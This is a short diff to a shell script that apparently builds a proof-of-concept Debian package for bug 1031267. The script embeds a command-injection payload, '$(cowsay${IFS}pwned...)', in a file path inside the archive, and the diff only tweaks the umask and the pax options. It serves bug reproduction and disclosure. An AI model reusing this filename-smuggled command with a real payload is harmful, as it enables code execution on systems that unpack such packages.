@@ -6,6 +6,7 @@
 # https://bugs.debian.org/1031267
 
 set -e -u
+umask 022
 mktargz() {
     tar --owner root --group root --mode 'u=rwX,go=rX' -I 'gzip -9n' -cf "$@"
 }
@@ -20,7 +21,7 @@ printf '2.0\n' > debian-binary
 mktargz control.tar.gz debian-binary
 payload='$(cowsay${IFS}pwned>/dev/tty;sleep${IFS}inf)'
 mktargz data.tar.gz --transform "s,.*,./usr/share/doc/$payload/changelog.gz," debian-binary
-pax -x ar -w debian-binary control.tar.gz data.tar.gz
+pax -M dist -x ar -w debian-binary control.tar.gz data.tar.gz
 cd /
 rm -rf "$tmpdir"
 
